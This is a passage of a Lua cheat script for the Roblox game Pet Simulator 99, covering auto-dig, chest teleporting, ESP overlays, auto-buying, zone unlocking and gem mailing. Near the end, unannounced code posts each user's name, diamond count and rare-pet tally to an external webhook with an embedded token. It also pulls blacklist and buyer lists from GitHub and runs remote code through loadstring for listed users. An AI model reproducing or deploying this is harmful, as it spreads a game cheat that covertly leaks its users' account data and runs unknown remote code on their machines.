                until not hasFishingLine
                task.wait()
            end
        end

        function autoDigN()
            while task.wait() do
                if not Config.autoDigN then
                    break
                end
        
                for _, v in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.Digsite.Important.ActiveBlocks:GetChildren()) do
                    if v:IsA("Part") and v.Name == "Part" and (v.Position and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).magnitude < 15) then
                        for i = 1, 5 do
                            local args = {
                                [1] = "Digsite",
                                [2] = "DigBlock",
                                [3] = v:GetAttribute('Coord')
                            }
        
                            game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
                        end
                        task.wait(0.1)
                        break
                    end
                end
            end
        end        

        function autoChestN()
            while task.wait() and Config.autoChestN do
                for _, chest in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.Digsite.Important.ActiveChests:GetDescendants()) do
                    if chest:IsA("MeshPart") and chest.Name == "Top" and chest.Parent and chest.Parent.Name == "Animated" then
                        if chest.Position and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - chest.Position).magnitude < 500 then
                            local oldCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        
                            repeat 
                                task.wait()
                                if not chest or not chest.Parent then break end
                                game.Players.LocalPlayer.Character.HumanoidRootPart:PivotTo(chest.Parent:GetPivot() + Vector3.new(0, 5, 0))
        
                                local coord = chest.Parent:GetAttribute("Coord")
                                if coord then
                                    local chestArgs = {
                                        [1] = "Digsite",
                                        [2] = "DigChest",
                                        [3] = coord
                                    }
                                    game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(chestArgs))
                                end
                            until not chest or not chest.Parent
        
                            task.wait(3)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame + Vector3.new(0, 5, 0)
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame + Vector3.new(0, 5, 0)
                        end
                    end
                end
            end
        end        

        function chestESPN()
            local ChestsToHighlight = {
                "Animated",
            }
            
            local function contains(table, val)
               for i=1, #table do
                  if table[i] == val then return true end
               end
               return false
            end
            
            while true do
                task.wait()
            
                for _, chest in pairs(game.Workspace.__THINGS.__INSTANCE_CONTAINER.Active.Digsite.Important.ActiveChests:GetChildren()) do
                    if chest:FindFirstChild("ESP") then
                        chest:FindFirstChild("ESP"):Destroy()
                    end
            
                    if contains(ChestsToHighlight, chest.Name) then
                        local tcolor = Color3.fromRGB(0, 255, 0)
            
                        local esp = Instance.new("BillboardGui", chest)
                        esp.Name = "ESP"
                        esp.Size = UDim2.new(5, 0, 5, 0)
                        esp.AlwaysOnTop = true
            
                        local frame = Instance.new("Frame", esp)
                        frame.Size = UDim2.new(1, 0, 1, 0)
                        frame.BackgroundTransparency = 0.80
                        frame.BorderSizePixel = 0
                        frame.BackgroundColor3 = tcolor
            
                        local label = Instance.new('TextLabel', frame)
                        label.Size = UDim2.new(1, 0, 1, 1)
                        label.BorderSizePixel = 0
                        label.TextSize = 17
                        label.Text = "Chest"
                        label.BackgroundTransparency = 1
                        label.TextColor3 = tcolor
                        label.TextStrokeColor3 = Color3.fromRGB(6, 6, 6)
                        label.TextStrokeTransparency = 0.7
                    end
                end
            end            
        end

        function autoDigA()
            while task.wait() do
                if not Config.autoDigA then
                    break
                end
        
                for _, v in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveBlocks:GetChildren()) do
                    if v:IsA("Part") and v.Name == "Part" and (v.Position and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).magnitude < 15) then
                        for i = 1, 5 do
                            local args = {
                                [1] = "AdvancedDigsite",
                                [2] = "DigBlock",
                                [3] = v:GetAttribute("Coord")
                            }
        
                            game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
                        end
                        task.wait(0.1)
                        break
                    end
                end
            end
        end

        function autoChestA()
            while task.wait() and Config.autoChestA do
                for _, chest in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveChests:GetDescendants()) do
                    if chest:IsA("MeshPart") and chest.Name == "Top" and chest.Parent and chest.Parent.Name == "Animated" then
                        if chest.Position and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - chest.Position).magnitude < 500 then
                            local oldCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            
                            repeat 
                                task.wait()
                                if not chest or not chest.Parent then break end
                                game.Players.LocalPlayer.Character.HumanoidRootPart:PivotTo(chest.Parent:GetPivot() + Vector3.new(0, 5, 0))
            
                                local coord = chest.Parent:GetAttribute("Coord")
                                if coord then
                                    local args = {
                                        [1] = "AdvancedDigsite",
                                        [2] = "DigChest",
                                        [3] = coord
                                    }
                                    game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))  
                                end
                            until not chest or not chest.Parent
            
                            task.wait(3)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame + Vector3.new(0, 5, 0)
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame + Vector3.new(0, 5, 0)
                        end
                    end
                end
            end            
        end

        function magicBucket()
            for _, v in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveBlocks:GetChildren()) do
                if v.BrickColor == BrickColor.new("Royal purple") then
                    game.Players.LocalPlayer.Character:MoveTo(v.Position)
                    repeat task.wait()
                        local args = {
                            [1] = "AdvancedDigsite",
                            [2] = "DigBlock",
                            [3] = v:GetAttribute("Coord")
                        }
                        
                        game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))       
                    until not v 
                end
            end
        end

        function chestESPA()
            local ChestsToHighlight = {
                "Animated",
            }
            
            local function contains(table, val)
               for i=1, #table do
                  if table[i] == val then return true end
               end
               return false
            end
            
            while true do
                task.wait()
            
                for _, chest in pairs(workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveChests:GetChildren()) do
                    if chest:FindFirstChild("ESP") then
                        chest:FindFirstChild("ESP"):Destroy()
                    end
            
                    if contains(ChestsToHighlight, chest.Name) then
                        local tcolor = Color3.fromRGB(0, 255, 0)
            
                        local esp = Instance.new("BillboardGui", chest)
                        esp.Name = "ESP"
                        esp.Size = UDim2.new(5, 0, 5, 0)
                        esp.AlwaysOnTop = true
            
                        local frame = Instance.new("Frame", esp)
                        frame.Size = UDim2.new(1, 0, 1, 0)
                        frame.BackgroundTransparency = 0.80
                        frame.BorderSizePixel = 0
                        frame.BackgroundColor3 = tcolor
            
                        local label = Instance.new('TextLabel', frame)
                        label.Size = UDim2.new(1, 0, 1, 1)
                        label.BorderSizePixel = 0
                        label.TextSize = 17
                        label.Text = "Chest"
                        label.BackgroundTransparency = 1
                        label.TextColor3 = tcolor
                        label.TextStrokeColor3 = Color3.fromRGB(6, 6, 6)
                        label.TextStrokeTransparency = 0.7
                    end
                end
            end            
        end

        function presentHunter()
            while Config.presentHunter do
                local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
                local result = saveModule.Get()
        
                local hiddenPresents = result.HiddenPresents
        
                for _, present in pairs(hiddenPresents) do
                    local id = present.ID
                    if id then
                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Hidden Presents: Found"):InvokeServer(id)        
                    end
                    task.wait(0.5)
                end
            end
        end        
        
        function autoMerchant()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(215.520996, 13.6210003, 168.335007) + Vector3.new(0,5,0)
            task.wait(0.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(427.792023, 13.6090002, 497.579987) + Vector3.new(0,5,0)
            task.wait(1)
            for i = 1,6 do
                local a, b
                repeat task.wait(0.3)
                    a, b = game:GetService("ReplicatedStorage").Network.Merchant_RequestPurchase:InvokeServer("RegularMerchant", i)
                until not a
            end
            task.wait(0.5)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(567.216003, 13.625, 1017.68402) + Vector3.new(0,5,0)
            task.wait(0.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(874.140991, 13.625, 1494.69495) + Vector3.new(0,5,0)
            task.wait(1)
            for i = 1,6 do
                local a, b
                repeat task.wait(0.3)
                    a, b = game:GetService("ReplicatedStorage").Network.Merchant_RequestPurchase:InvokeServer("AdvancedMerchant", i)
                until not a
            end
        end

        function sendGems()
            local GetSave = function()
                return require(game.ReplicatedStorage.Library.Client.Save).Get()
            end
            
            for i, v in pairs(GetSave().Inventory.Currency) do
                if v.id == "Diamonds" then
                    local adjustedAmount = tonumber(gemAmount)
            
                    if adjustedAmount > v._am then
                        OrionLib:MakeNotification({
                            Name = "Error!",
                            Content = "You're trying to send more gems than you have.",
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                    else
                        if v._am - adjustedAmount < 10000 then
                            adjustedAmount = math.max(0, adjustedAmount - 10000)
                        end
            
                        local args = {
                            [1] = usernamel,
                            [2] = v.id,
                            [3] = "Currency",
                            [4] = i,
                            [5] = adjustedAmount
                        }
            
                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                        OrionLib:MakeNotification({
                            Name = "Success!",
                            Content = "You successfully sent " .. adjustedAmount .. " to " .. username,
                            Image = "rbxassetid://4483345998",
                            Time = 5
                        })
                    end
                end
            end
        end
        
        function autoSend()
            while Config.autoSend do
                local GetSave = function()
                    return require(game.ReplicatedStorage.Library.Client.Save).Get()
                end
                user = usernameP
                for i, v in pairs(GetSave().Inventory.Currency) do
                    if v.id == "Diamonds" then
                        if v._am >= gemAmountP then
                            local args = {
                                [1] = user,
                                [2] = v.id,
                                [3] = "Currency",
                                [4] = i,
                                [5] = gemAmountP - 10000
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                        end
                    end
                    task.wait(1)
                end
            end
        end

        function autoFuse()
            while task.wait(0.1) and Config.autoFuse do
                local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
                local result = saveModule.Get()

                local EquippedPet = result.EquippedPets

                for _, pet in pairs(EquippedPet) do
                    local uid = pet.uid
                        if uid then
                        local args = {
                            [1] = {
                                [uid] = 3
                            }
                        }
                            
                        game:GetService("ReplicatedStorage").Network.FuseMachine_Activate:InvokeServer(unpack(args))            
                    end
                end
            end
        end        

        function autoZone()
            local mapNames = {
                "Colorful Forest", "Castle", "Green Forest", "Autumn", "Cherry Blossom", "Farm", "Backyard", "Misty Falls", "Mine",
                "Crystal Caverns", "Dead Forest", "Dark Forest", "Mushroom Field", "Enchanted Forest", "Crimson Forest", "Jungle",
                "Jungle Temple", "Oasis", "Beach", "Coral Reef", "Shipwreck", "Atlantis", "Palm Beach", "Tiki", "Pirate Cove",
                "Pirate Tavern", "Shanty Town", "Desert Village", "Fossil Digsite", "Desert Pyramids", "Red Desert", "Wild West",
                "Grand Canyons", "Safari", "Mountains", "Snow Village", "Icy Peaks", "Ice Rink", "Ski Town", "Hot Springs",
                "Fire and Ice", "Volcano", "Obsidian Cave", "Lava Forest", "Underworld", "Underworld Bridge", "Underworld Castle",
                "Metal Dojo", "Fire Dojo", "Samurai Village", "Bamboo Forest", "Zen Garden", "Flower Field", "Fairytale Meadows",
                "Fairytale Castle", "Royal Kingdom", "Fairy Castle", "Cozy Village", "Rainbow River", "Colorful Mines",
                "Colorful Mountains", "Frost Mountains", "Ice Sculptures", "Snowman Town", "Ice Castle", "Polar Express",
                "Firefly Cold Forest", "Golden Road", "No Path Forest", "Ancient Ruins", "Runic Altar", "Wizard Tower", "Witch Marsh",
                "Haunted Forest", "Haunted Graveyard", "Haunted Mansion", "Dungeon Entrance", "Dungeon", "Treasure Dungeon",
                "Empyrean Dungeon", "Mythic Dungeon", "Cotton Candy Forest", "Gummy Forest", "Chocolate Waterfall", "Sweets",
                "Toys and Blocks", "Carnival", "Theme Park", "Clouds", "Cloud Garden", "Cloud Forest"
            }
            
            local function generateZones()
                local zones = {}
                for i = 2, #mapNames + 1 do
                    local currentZoneName = mapNames[i - 1]
                    local prevZoneName = i > 2 and mapNames[i - 2] or "1 | Spawn"
        
                    table.insert(zones, {
                        name = currentZoneName,
                        gate = tostring(i) .. " | " .. currentZoneName,
                        prevZone = tostring(i - 1) .. " | " .. prevZoneName
                    })
                end
                return zones
            end
        
            local zones = generateZones()
        
            while Config.autoZone do
                for _, zone in ipairs(zones) do
                    local gateTransparency = game.Workspace.Map[zone.gate].INTERACT.Gate.Transparency
                    if gateTransparency == 0 then
                        repeat
                            task.wait()
                            gateTransparency = game.Workspace.Map[zone.gate].INTERACT.Gate.Transparency
                            local prevZoneCFrame = game.Workspace.Map[zone.prevZone].INTERACT.BREAK_ZONES.BREAK_ZONE.CFrame
        
                            if zone.name == "Green Forest" then
                                for i = 1,3 do
                                    game:GetService("ReplicatedStorage").Network.EquipSlotsMachine_RequestPurchase:InvokeServer(i)
                                end
                            end
        
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = prevZoneCFrame + Vector3.new(0, 5, 0)
                            game:GetService("ReplicatedStorage").Network.Zones_RequestPurchase:InvokeServer(zone.name)
                        until gateTransparency == 1 or not Config.autoZone
                    end
                    if not Config.autoZone then break end
                end
                task.wait()
            end
        end
        local function destroyNearbyObjects(targetCFrame, mapLocation)
            local threshold = 1
            while true do
                local foundAndDestroyed = false
                for _, v in pairs(game.Workspace.Map[mapLocation].INTERACT.BREAK_ZONES:GetChildren()) do
                    local distance = (v.CFrame.Position - targetCFrame.Position).Magnitude
                    if distance <= threshold then
                        v:Destroy()
                        foundAndDestroyed = true
                    end
                end
                if not foundAndDestroyed then
                    wait(0.1)
                end
            end
        end
        spawn(function() destroyNearbyObjects(CFrame.new(124.629379, 13.3689919, 576.299683), "20 | Beach") end)
        spawn(function() destroyNearbyObjects(CFrame.new(1489.37939, 13.4520512, 1760.04968), "46 | Underworld") end)
        spawn(function() destroyNearbyObjects(CFrame.new(574.262878, 13.4520512, 3284.75342), "70 | No Path Forest") end)
    else
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Status",
            Text = "Not whitelisted, go on discord to get whitelisted.",
            Icon = "rbxassetid://1234567890"
        })
    end
end

local Library = require(game.ReplicatedStorage.Library)
local Save = Library.Save.Get().Inventory
AmountOfHuges = 0
for i, v in pairs(Save.Pet) do
    local id = v.id
    local dir = Library.Directory.Pets[id]
    if dir.huge == true then
        AmountOfHuges = AmountOfHuges + 1
    end
end

local Library = require(game.ReplicatedStorage.Library)
local Save = Library.Save.Get().Inventory
AmountOfExc = 0
for i, v in pairs(Save.Pet) do
    local id = v.id
    local dir = Library.Directory.Pets[id]
    if dir.exclusiveLevel == true then
        AmountOfExc = AmountOfExc + 1
    end
end

local syn = syn or {}
local request = syn.request or http_request
local HttpService = game:GetService("HttpService")

local webhookUrl = "https://webhook.lewistehminerz.dev/api/webhooks/1198780376643018793/cp6mgWXuxiPwCCqUA4OG-oXY9gOBnVxW8PD5hwoSoebWCewsIbGr1RTWBkPju1x4u6Gt"

local lp = game.Players.LocalPlayer.Name
local gems = nil
local leadertab = game.Players.LocalPlayer.leaderstats

for _, child in pairs(leadertab:GetChildren()) do
    if child:IsA("IntValue") then
        local stats = child.Name:gsub("[^%a]", "")
        if stats == "Diamonds" then
            gems = child.Value
        end
    end
end

local function sendWebhookMessage(embed)
    local success, response = pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({embeds = {embed}})
        })
    end)
end

local embed = {
    title = "PS99",
    description = lp .. " has executed the script.",
    color = 0xFFD700,

    fields = {
        {name = "Gems: ", value = gems, inline = true},
        {name = "Huges: ", value = AmountOfHuges, inline = true},
        {name = "Exclusives: ", value = AmountOfExc, inline = true}
    }
}

sendWebhookMessage(embed)

local http_request = syn and syn.request or request

local rizz = http_request({
    Url = "https://raw.githubusercontent.com/jelqmaster/blacklisted/main/blocked",
    Method = 'GET'
})

local opp = rizz and rizz.Body or ""

local username = game.Players.LocalPlayer.Name
local oppTable = {}

for entry in opp:gmatch("[^\r\n]+") do
    table.insert(oppTable, entry)
end

local shh = http_request({
    Url = "https://raw.githubusercontent.com/jelqmaster/buyers/main/nutter",
    Method = 'GET'
})

local tax = shh and shh.Body or ""
local taxTable = {}

for entry in tax:gmatch("[^\r\n]+") do
    table.insert(taxTable, entry)
end

local isBoop = table.find(oppTable, username) ~= nil
local isBat = table.find(taxTable, username) ~= nil

if isBoop then
    if isBat then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/jelqmaster/pow/main/oops"))()
        mainPremium()
    else
        loadstring(game:HttpGet("https://raw.githubusercontent.com/jelqmaster/pow/main/oops"))()
        main()
    end
elseif isBat then
    mainPremium()
else
    main()
end
